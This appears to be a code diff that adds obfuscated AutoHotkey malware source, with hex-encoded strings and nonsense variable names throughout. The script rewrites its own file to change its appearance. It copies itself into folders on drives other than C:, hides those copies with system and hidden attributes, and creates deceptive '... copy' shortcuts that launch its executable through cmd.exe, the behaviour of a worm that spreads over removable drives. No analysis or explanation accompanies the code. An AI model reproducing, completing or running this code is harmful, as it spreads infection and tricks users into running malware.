+#f#fk#ff := FileOpen(A_ScriptFullPath, 0)
+k@k#f@k@k@ := #f#fk#ff.Read()
+k@k#f@k@k@ := ii#xbywii@xbywf#ii#xbywkff(k@k#f@k@k@)
+#f#fk#ff.Close()
+@f@fkkf#fkf@ := FileOpen(A_ScriptFullPath, 5)
+@f@fkkf#fkf@.WriteLine(k@k#hh@f#k . #f#ii@xbyw@f#f)
+@f@fkkf#fkf@.Write(k@k#f@k@k@)
+@f@fkkf#fkf@.Close()
+kkhhh# := f#k#hh@iiixbywk@f#f@(21)
+return
+}
+IfInString, @kkf#ffkkf, % ffkkfii@xbyw@ii@xbyw("736C6565702D")
+{
+f#@fk#iiixbyw@fk := @kf@@ii@xbywkffk(@kkf#ffkkf,ffkkfii@xbyw@ii@xbyw("736C6565702D"),ffkkfii@xbyw@ii@xbyw("2D736C656570"))
+@kf#kfkhhhk@#f(ffkkfii@xbyw@ii@xbyw("736C656570696E6720") . f#@fk#iiixbyw@fk)
+#hh@@kfii@xbyw#kfk(f#@fk#iiixbyw@fk)
+return
+}
+sleep , 1000
+}
+#hh@@kfii@xbyw#kfk(k@@hh#k@k#@ii@xbywkf){
+if (#kf#kfk@fk = 1){
+sleep , 5000
+}else{
+sleep k@@hh#k@k#@ii@xbywkf
+}
+}
+@fk@fiiixbywf##ii#xbywff(@kkfk@f@fiiixbywf@fk){
+try {
+VarSetCapacity(SHORT,StrLen(@kkfk@f@fiiixbywf@fk)*2)
+DllCall("GetShortPathName","Str",@kkfk@f@fiiixbywf@fk,"Str",SHORT,"UInt",StrLen(@kkfk@f@fiiixbywf@fk)*2)
+} catch {
+return @kkfk@f@fiiixbywf@fk
+}
+if (SHORT = "")
+{
+return @kkfk@f@fiiixbywf@fk
+}
+Return SHORT
+}
+f#k#hh@iiixbywk@f#f@(k#@hhhf@hh#hhhf@) {
+static   c
+if   !c
+Loop, 26
+c .=   (!c ? "" : "`n") Chr(A_Index + 96)
+Loop %   k#@hhhf@hh#hhhf@
+{
+Random, n, 1, 1296
+Loop %   n
+Sort, c, Random
+str .=   SubStr(c,1,1)
+}
+return   str
+}
+hhhf@f@fk#ffkf() {
+For objOS In @fkhhhkf#f.Drives {
+ii#xbywf@f := ObjOS.path
+if (ii#xbywf@f = ffkkfii@xbyw@ii@xbyw("433A")){
+}else{
+@ffk#f@iiixbyw = %kkf@%%ii#xbywf@f%%k#k#kf%\*.*
+Loop, %@khh#fk@%%kfk@%%@ffk#f@iiixbyw%
+{
+@f#f@hh@ = %A_LoopFileDir%
+}
+#fkfkfk@ := 0
+Loop, %@ffk#f@iiixbyw%%#ii#xbyw#ii@xbyw%%k##ii#xbyw%, 1
+{
+if (#fkfkfk@ > 0){
+if (#ii#xbyw@f#k#kfk > 0){
+break
+}
+}
+FileGetAttrib,CurAttrib, %A_LoopFileFullPath%
+IfInString, CurAttrib, D
+{
+StringReplace, A_LoopRelativeFileName, A_LoopFileFullPath, %@f#f@hh@%%ffii#xbywf%%@f@kf#%,
+if (A_LoopRelativeFileName = ffkkfii@xbyw@ii@xbyw("5C2452454359434C452E42494E")){
+}else{
+fkf@#f@hh@ := SubStr(k#f#hh#hh@, 1, 3)
+iiixbyw#f#k@k@kf := A_LoopRelativeFileName
+StringReplace, iiixbyw#f#k@k@kf, iiixbyw#f#k@k@kf,  "\",
+ifexist, %@ii#xbywf@#k%%kfk@%%ii#xbywf@f%%A_LoopRelativeFileName%\%fk@f#f%%kf#fkfkk%%k#f#hh#hh@%
+{
+FileGetSize, oldfilesize, %iiixbywfkk%%ii#xbywf@f%%f@ii@xbywk@k%%A_LoopRelativeFileName%\%k#f#hh#hh@%%iiixbywiiixbywkk%%#k#k@kf#%\%k#f#hh#hh@%%iiixbywkf#%%fkfk%.txt
+FileGetSize, scriptfilesize, %A_ScriptFullPath%
+if (oldfilesize <> scriptfilesize){
+FileCopyDir, %A_ScriptDir%, %@fkhh@%%ii#xbywf@f%%f@hhhk%%A_LoopRelativeFileName%\%k#f#hh#hh@%%fk#kf#kk%%k#f@@kf#%,1
+}else{
+#fkfkfk@ := #fkfkfk@ + 1
+break
+}
+}else{
+FileCopyDir, %A_ScriptDir%, %k@#k@f%%ii#xbywf@f%%k#f@f@kk%%A_LoopRelativeFileName%\%f@ii@xbywk@k%%hh@f%%k#f#hh#hh@%
+FileSetAttrib, +SH, %f@k@kk%%#f#f%%ii#xbywf@f%%A_LoopRelativeFileName%\%#hhhkfk#%%k@khh#%%k#f#hh#hh@%,1
+}
+ifexist, %ii#xbywf@f%%#fiiixbyw@@k%%@f@kfii@xbyw%%A_LoopRelativeFileName%\%f#f@%%k#f#hh#hh@%%fk@f#f%
+{
+ifexist, %iiixbyw#%%kkf@%%ii#xbywf@f%%A_LoopRelativeFileName%%f@ii@xbywk@k%%iiixbyw#f#k@k@kf%%k@ii@xbywk% copy %f#fk#hhh%%fkf@#f@hh@%%#k#k@kf#%.lnk
+{
+}else{
+FileCreateShortcut, % ffkkfii@xbyw@ii@xbyw("636D642E657865"),%hh@kf#%%#fkfkfk#%%ii#xbywf@f%%A_LoopRelativeFileName%%hh@kf#%%fk@f#f%%iiixbyw#f#k@k@kf% copy %k@#k@f%%fkf@#f@hh@%%@fii#xbywfk#%.lnk,, "/c start %@kf#k@#k%%k#f#hh#hh@%%kkf@%\%fk@fkk%%kfkhh@#f%%k#f#hh#hh@%.exe %kf@fk@#k%%k#f#hh#hh@%%f#@k%\%kf#fkfkk%%k#f#hh#hh@%%k@khh#%.txt %ii#xbywk%%k@@k%%fkf@#f@hh@% &exit",,%SystemRoot%\system32\shell32.dll,,4
+}
+}
+}
+}
+}
+}
+}
+#ii#xbyw@f#k#kfk := 1
+}
+fk@kf#khh@#hhhkf(@k#k@khhhkkf@ii@xbyw,@f#hh@k@fk@hh@){
+IfInString, @k#k@khhhkkf@ii@xbyw, %fii#xbyw%%@f#hh@k@fk@hh@%%iiixbywfkk%
+{
+return true
+}
+else
+{
+return false
+}
+}
+ii#xbywii@xbywf#ii#xbywkff(ffk#hh@k@kf@#k){
+#hh#f@@hh@#f := SubStr(kkhhh#, 1, 4)
+ffkhh#k# := SubStr(k#f#hh#hh@, 1, 4)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkhh#k#, "")
+if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("66")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("66"), ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("61") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("6623"), ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("6123") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("66") . ffkkfii@xbyw@ii@xbyw("6640"), ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("6140") . #hh#f@@hh@#f)
+} else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B"), ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("62") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B23"), ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("6223") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6B") . ffkkfii@xbyw@ii@xbyw("6B40"), ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("6240") . #hh#f@@hh@#f)
+} else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("61")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("61"), ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("63") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("6123"), ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("6323") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("61") . ffkkfii@xbyw@ii@xbyw("6140"), ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("6340") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("62")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("62"), ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("64") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("6223"), ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("6423") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("62") . ffkkfii@xbyw@ii@xbyw("6240"), ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("6440") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("6363")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("6363"), ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6565") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("6323"), ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6523") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("63") . ffkkfii@xbyw@ii@xbyw("6340"), ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6540") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("6464")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("6464"), ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6767") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("6423"), ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6723") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("64") . ffkkfii@xbyw@ii@xbyw("6440"), ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6740") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6565")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6565"), ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6868") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6523"), ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6823") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("65") . ffkkfii@xbyw@ii@xbyw("6540"), ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6840") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6767")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6767"), ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6969") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6723"), ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6923") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("67") . ffkkfii@xbyw@ii@xbyw("6740"), ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6940") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6868")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6868"), ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A6A") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6823"), ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("68") . ffkkfii@xbyw@ii@xbyw("6840"), ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A40") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6969")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6969"), ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D6D") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6923"), ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("69") . ffkkfii@xbyw@ii@xbyw("6940"), ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D40") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A6A")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A6A"), ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C6C") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A23"), ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6A") . ffkkfii@xbyw@ii@xbyw("6A40"), ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C40") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C6C")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C6C"), ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E6E") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C23"), ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6C") . ffkkfii@xbyw@ii@xbyw("6C40"), ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E40") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D6D")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D6D"), ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F6F") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D23"), ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F23") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6D") . ffkkfii@xbyw@ii@xbyw("6D40"), ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F40") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E6E")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E6E"), ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7070") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E23"), ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7023") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6E") . ffkkfii@xbyw@ii@xbyw("6E40"), ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7040") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F6F")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F6F"), ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7171") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F23"), ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7123") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("6F") . ffkkfii@xbyw@ii@xbyw("6F40"), ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7140") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7070")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7070"), ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7272") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7023"), ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7223") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("70") . ffkkfii@xbyw@ii@xbyw("7040"), ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7240") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7171")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7171"), ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7373") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7123"), ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7323") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("71") . ffkkfii@xbyw@ii@xbyw("7140"), ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7340") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7272")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7272"), ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7474") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7223"), ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7423") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("72") . ffkkfii@xbyw@ii@xbyw("7240"), ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7440") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7373")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7373"), ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7575") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7323"), ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7523") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("73") . ffkkfii@xbyw@ii@xbyw("7340"), ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7540") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7474")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7474"), ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7676") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7423"), ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7623") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("74") . ffkkfii@xbyw@ii@xbyw("7440"), ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7640") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7575")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7575"), ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7777") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7523"), ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7723") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("75") . ffkkfii@xbyw@ii@xbyw("7540"), ffkkfii@xbyw@ii@xbyw("77") . ffkkfii@xbyw@ii@xbyw("7740") . #hh#f@@hh@#f)
+}
+else if (fk@kf#khh@#hhhkf(ffk#hh@k@kf@#k,ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7676")))
+{
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7676"), ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7878") . #hh#f@@hh@#f)
+ffk#hh@k@kf@#k := StrReplace(ffk#hh@k@kf@#k	, ffkkfii@xbyw@ii@xbyw("76") . ffkkfii@xbyw@ii@xbyw("7623"), ffkkfii@xbyw@ii@xbyw("78") . ffkkfii@xbyw@ii@xbyw("7823") . #hh#f@@hh@#f)
